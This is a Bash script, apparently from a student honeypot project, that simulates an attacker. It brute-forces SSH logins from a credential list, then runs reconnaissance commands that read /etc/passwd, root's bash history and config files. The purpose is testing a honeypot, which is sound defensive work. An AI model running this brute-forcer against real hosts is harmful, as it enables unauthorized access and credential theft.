#!/bin/bash
# ============================================================================
# 蜜罐攻击模拟脚本
# 功能：模拟黑客对 SSH 蜜罐的暴力破解和命令执行
# 作者：CA2 Project Team
# ============================================================================

set -u  # 遇到未定义变量时退出

# ==================== 配置区 ====================
HONEYPOT_IP="${1:-192.168.122.123}"   # 蜜罐 IP，支持命令行参数
HONEYPOT_PORT="${2:-22}"              # 蜜罐端口（VPS 上 Cowrie 占 22；旧 VirtualBox 环境传 2222）
CREDS_FILE="./payloads/common_creds.txt"  # 凭据字典
LOG_DIR="./logs"                      # 本地日志目录
ATTACK_LOG="$LOG_DIR/attack_$(date +%Y%m%d_%H%M%S).log"  # 攻击日志
SUCCESS_LOG="$LOG_DIR/successful_logins.log"              # 成功登录记录
DELAY_BETWEEN_ATTEMPTS=2              # 每次尝试间隔（秒）
DELAY_BETWEEN_COMMANDS=1              # 命令执行间隔（秒）

# 模拟攻击命令序列（黑客常用侦察命令）
ATTACK_COMMANDS=(
    "whoami"
    "uname -a"
    "cat /etc/os-release"
    "ifconfig"
    "ip addr"
    "netstat -tulnp"
    "ps aux"
    "cat /etc/passwd"
    "ls -la /home"
    "ls -la /root"
    "df -h"
    "free -m"
    "cat /proc/cpuinfo"
    "w"
    "last -20"
    "crontab -l"
    "cat /root/.bash_history"
    "find / -name '*.conf' 2>/dev/null | head -20"
)

# ==================== 颜色定义 ====================
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'  # No Color

# ==================== 函数定义 ====================

# 打印带时间戳的日志
log_msg() {
    local level="$1"
    shift
    local msg="$*"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] [$level] $msg" | tee -a "$ATTACK_LOG"
}

# 打印横幅
print_banner() {
    echo -e "${BLUE}"
    echo "╔════════════════════════════════════════════════════════════╗"
    echo "║          SSH 蜜罐攻击模拟工具 v1.0                        ║"
    echo "║          Attack Simulation Script                          ║"
    echo "╚════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# 检查依赖
check_dependencies() {
    local missing_deps=()
    for cmd in sshpass ssh timeout; do
        if ! command -v $cmd &> /dev/null; then
            missing_deps+=("$cmd")
        fi
    done

    if [ ${#missing_deps[@]} -gt 0 ]; then
        log_msg "ERROR" "缺少依赖: ${missing_deps[*]}"
        log_msg "INFO" "请安装: sudo pacman -S sshpass openssh coreutils"
        exit 1
    fi
}

# 测试目标连通性
test_connectivity() {
    log_msg "INFO" "测试目标连通性: $HONEYPOT_IP:$HONEYPOT_PORT"

    if timeout 5 bash -c "cat < /dev/null > /dev/tcp/$HONEYPOT_IP/$HONEYPOT_PORT" 2>/dev/null; then
        echo -e "${GREEN}✓ 目标端口可达${NC}"
        log_msg "INFO" "目标端口 $HONEYPOT_IP:$HONEYPOT_PORT 可达"
        return 0
    else
        echo -e "${RED}✗ 目标端口不可达${NC}"
        log_msg "ERROR" "无法连接到 $HONEYPOT_IP:$HONEYPOT_PORT"
        return 1
    fi
}

# SSH 登录尝试
try_login() {
    local username="$1"
    local password="$2"
    local attempt_id="$3"

    log_msg "INFO" "尝试登录 [$attempt_id] - 用户: $username, 密码: $password"

    # 使用 sshpass 尝试登录（设置 5 秒超时）
    # StrictHostKeyChecking=no 跳过主机密钥验证
    # UserKnownHostsFile=/dev/null 不保存主机密钥
    # 不要加 BatchMode=yes：它会禁用密码提示，sshpass 就无法喂入密码，导致每次都失败
    # 强制走密码认证、关掉公钥、只提示一次，行为确定且贴近真实爆破
    if timeout 10 sshpass -p "$password" ssh \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o ConnectTimeout=5 \
        -o PreferredAuthentications=password \
        -o PubkeyAuthentication=no \
        -o NumberOfPasswordPrompts=1 \
        -p "$HONEYPOT_PORT" \
        "$username@$HONEYPOT_IP" \
        "echo 'LOGIN_SUCCESS'" 2>/dev/null | grep -q "LOGIN_SUCCESS"; then

        echo -e "${GREEN}✓ 登录成功: $username:$password${NC}"
        log_msg "SUCCESS" "登录成功 - $username:$password"
        echo "$username:$password" >> "$SUCCESS_LOG"
        return 0
    else
        echo -e "${RED}✗ 登录失败: $username:$password${NC}"
        log_msg "FAIL" "登录失败 - $username:$password"
        return 1
    fi
}

# 在蜜罐上执行命令
execute_commands() {
    local username="$1"
    local password="$2"

    log_msg "INFO" "开始在蜜罐上执行侦察命令..."
    echo -e "${YELLOW}[*] 模拟黑客侦察行为...${NC}"

    local cmd_count=0
    local success_count=0

    for cmd in "${ATTACK_COMMANDS[@]}"; do
        ((cmd_count++))
        echo -e "${BLUE}[$cmd_count/${#ATTACK_COMMANDS[@]}] 执行: $cmd${NC}"
        log_msg "CMD" "执行命令: $cmd"

        # 执行命令并捕获输出
        local output
        output=$(timeout 15 sshpass -p "$password" ssh \
            -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null \
            -o ConnectTimeout=5 \
            -o PreferredAuthentications=password \
            -o PubkeyAuthentication=no \
            -o NumberOfPasswordPrompts=1 \
            -p "$HONEYPOT_PORT" \
            "$username@$HONEYPOT_IP" \
            "$cmd" 2>&1)

        if [ $? -eq 0 ]; then
            ((success_count++))
            log_msg "CMD_SUCCESS" "命令成功: $cmd"
            # 保存命令输出（前 5 行）
            echo "$output" | head -5 >> "$ATTACK_LOG"
        else
            log_msg "CMD_FAIL" "命令失败: $cmd"
        fi

        sleep "$DELAY_BETWEEN_COMMANDS"
    done

    log_msg "INFO" "命令执行完成: 成功 $success_count/${#ATTACK_COMMANDS[@]}"
    echo -e "${GREEN}✓ 侦察完成: $success_count/${#ATTACK_COMMANDS[@]} 命令成功${NC}"
}

# 主函数
main() {
    print_banner

    # 创建日志目录
    mkdir -p "$LOG_DIR"

    log_msg "INFO" "========== 攻击模拟开始 =========="
    log_msg "INFO" "目标: $HONEYPOT_IP:$HONEYPOT_PORT"
    log_msg "INFO" "字典: $CREDS_FILE"
    log_msg "INFO" "日志: $ATTACK_LOG"

    # 检查依赖
    check_dependencies

    # 测试连通性
    if ! test_connectivity; then
        log_msg "ERROR" "目标不可达，终止攻击"
        exit 1
    fi

    # 检查凭据文件
    if [ ! -f "$CREDS_FILE" ]; then
        log_msg "ERROR" "凭据文件不存在: $CREDS_FILE"
        exit 1
    fi

    # 统计凭据总数
    local total_creds=$(grep -c ':' "$CREDS_FILE")
    log_msg "INFO" "加载凭据: $total_creds 组"

    echo ""
    echo -e "${YELLOW}[*] 开始暴力破解...${NC}"
    echo ""

    local attempt_count=0
    local success_count=0
    local successful_creds=()

    # 读取凭据文件并尝试登录
    while IFS=':' read -r username password; do
        # 跳过空行和注释
        [[ -z "$username" || "$username" =~ ^# ]] && continue

        ((attempt_count++))

        if try_login "$username" "$password" "$attempt_count/$total_creds"; then
            ((success_count++))
            successful_creds+=("$username:$password")
        fi

        sleep "$DELAY_BETWEEN_ATTEMPTS"
    done < "$CREDS_FILE"

    echo ""
    log_msg "INFO" "========== 暴力破解完成 =========="
    log_msg "INFO" "总尝试: $attempt_count 次"
    log_msg "INFO" "成功登录: $success_count 次"

    # 如果有成功登录，执行侦察命令
    if [ $success_count -gt 0 ]; then
        echo ""
        echo -e "${GREEN}[+] 发现 $success_count 个有效凭据${NC}"

        # 使用第一个成功的凭据执行命令
        IFS=':' read -r username password <<< "${successful_creds[0]}"
        log_msg "INFO" "使用凭据 $username:$password 执行侦察"

        echo ""
        execute_commands "$username" "$password"
    else
        echo -e "${RED}[-] 未找到有效凭据${NC}"
    fi

    echo ""
    log_msg "INFO" "========== 攻击模拟结束 =========="
    echo -e "${BLUE}[i] 完整日志: $ATTACK_LOG${NC}"
    [ -f "$SUCCESS_LOG" ] && echo -e "${BLUE}[i] 成功凭据: $SUCCESS_LOG${NC}"
}

# 执行主函数
main "$@"
